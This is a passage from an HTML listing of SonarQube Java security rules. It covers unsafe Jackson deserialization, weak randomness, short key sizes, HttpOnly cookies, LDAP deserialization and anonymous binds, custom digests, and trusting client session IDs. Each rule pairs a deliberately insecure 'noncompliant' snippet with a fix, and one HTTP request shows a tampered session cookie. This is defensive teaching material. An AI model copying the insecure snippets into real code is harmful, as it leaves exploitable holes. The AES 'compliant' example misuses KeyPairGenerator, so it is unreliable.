  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li><li> or when the annotation <code>&#64;JsonTypeInfo</code> is set at class, interface or field levels and configured with <code>use &#61;
  JsonTypeInfo.Id.CLASS</code> or <code>use &#61; Id.MINIMAL_CLASS</code>. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> You configured the Jackson deserializer as mentioned above. </li><li> The serialized data might come from an untrusted source. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered &#34;deserialization gadgets&#34;. </li><li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li><li> If possible, use <code>&#64;JsonTypeInfo(use &#61; Id.NAME)</code> instead of <code>&#64;JsonTypeInfo(use &#61; Id.CLASS)</code> or <code>&#64;JsonTypeInfo(use &#61;
  Id. MINIMAL_CLASS)</code> and so rely on <code>&#64;JsonTypeName</code> and <code>&#64;JsonSubTypes</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
ObjectMapper mapper &#61; new ObjectMapper();
mapper.enableDefaultTyping(); // Sensitive
</pre>
<pre>
&#64;JsonTypeInfo(use &#61; Id.CLASS) // Sensitive
abstract class PhoneNumber {
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> OWASP - <a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data" rel="nofollow">Deserialization of untrusted data</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> <a href="https://medium.com/&#64;cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062" rel="nofollow">On Jackson CVEs: Don’t
  Panic</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15095" rel="nofollow">CVE-2017-1509</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7525" rel="nofollow">CVE-2017-7525</a> </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION" rel="nofollow">JACKSON_UNSAFE_DESERIALIZATION</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2245">
              java:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a cryptographically strong random number generator (RNG) like &#34;java.security.SecureRandom&#34; in place of this PRNG. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Random random &#61; new Random(); // Sensitive use of Random
byte bytes[] &#61; new byte[20];
random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random &#61; new SecureRandom(); // Compliant for security-sensitive use cases
byte bytes[] &#61; new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ" rel="nofollow">CERT, MSC02-J.</a> - Generate strong random numbers </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ" rel="nofollow">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ" rel="nofollow">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4426">
              java:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;RSA&#34;);
        keyPairGenerator.initialize(1024); // Noncompliant

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<p>Here is an example of a private key generation with AES:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import java.security.KeyGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyGenerator keyGenerator &#61; KeyGenerator.getInstance(&#34;AES&#34;);
        keyGenerator.initialize(64); // Noncompliant

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator    &#61; KeyPairGenerator.getInstance(&#34;EC&#34;);
        ECGenParameterSpec ellipticCurveName &#61; new ECGenParameterSpec(&#34;secp112r1&#34;); // Noncompliant
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;RSA&#34;);
        keyPairGenerator.initialize(2048);

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;AES&#34;);
        keyPairGenerator.initialize(128);

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator    &#61; KeyPairGenerator.getInstance(&#34;EC&#34;);
        ECGenParameterSpec ellipticCurveName &#61; new ECGenParameterSpec(&#34;secp256r1&#34;);
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3330">
              java:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly%28boolean%29" rel="nofollow"><code>HttpOnly</code></a> flag is
set to <em>false:</em></p>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly&#61;true)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4434">
              java:S4434
            </a>
          </td>
          <td>
            <details>
              <p>JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application connects to an untrusted LDAP directory. </li><li> User-controlled objects can be stored in the LDAP directory. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable deserialization of LDAP objects.</p>
<h2>Sensitive Code Example</h2>
<pre>
DirContext ctx &#61; new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx &#61; new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false, // Compliant
            deref));
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" rel="nofollow">BlackHat
  presentation</a> </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING" rel="nofollow">LDAP_ENTRY_POISONING</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2257">
              java:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, …​ should be used instead.</p>
<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a standard algorithm instead of creating a custom one. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public class MyCryptographicAlgorithm extends MessageDigest {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest digest &#61; MessageDigest.getInstance(&#34;SHA-256&#34;);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST" rel="nofollow">MessageDigest is Custom</a>
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2254">
              java:S2254
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>
<blockquote>
  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client
  did not specify a session ID, this method returns null.</p>
</blockquote>
<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually
updating the value of this session ID in the HTTP request.</p>
<p>Here is an example of an updated HTTP header:</p>
<pre>
GET /pageSomeWhere HTTP/1.1
Host: webSite.com
User-Agent: Mozilla/5.0
Cookie: JSESSIONID&#61;Hacked_Session_Value&#39;&#39;&#39;&#34;&gt;
</pre>
<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (e.g.
Tomcat or Jetty) to see if the value matches the ID of an existing session. If it does not, the user should be considered unauthenticated. Moreover,
this session ID should never be logged as is but logged using a one-way hash to prevent hijacking of active sessions.</p>
<h3>Noncompliant code example</h3>
<pre>
if (isActiveSession(request.getRequestedSessionId())) {
  // ...
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/807" rel="nofollow">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4433">
              java:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul><li> <em>Anonymous</em> Authentication </li><li> <em>Unauthenticated</em> Authentication </li><li> <em>Name/Password</em> Authentication </li></ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env &#61; new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, &#34;com.sun.jndi.ldap.LdapCtxFactory&#34;);
env.put(Context.PROVIDER_URL, &#34;ldap://localhost:389/o&#61;JNDITutorial&#34;);

// Use anonymous authentication
env.put(Context.SECURITY_AUTHENTICATION, &#34;none&#34;); // Noncompliant

// Create the initial context
DirContext ctx &#61; new InitialDirContext(env);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env &#61; new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, &#34;com.sun.jndi.ldap.LdapCtxFactory&#34;);
env.put(Context.PROVIDER_URL, &#34;ldap://localhost:389/o&#61;Example&#34;);

// Use simple authentication
env.put(Context.SECURITY_AUTHENTICATION, &#34;simple&#34;);
env.put(Context.SECURITY_PRINCIPAL, &#34;cn&#61;local, ou&#61;Unit, o&#61;Example&#34;);
env.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());

// Create the initial context
DirContext ctx &#61; new InitialDirContext(env);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5" rel="nofollow">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5527">
              java:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
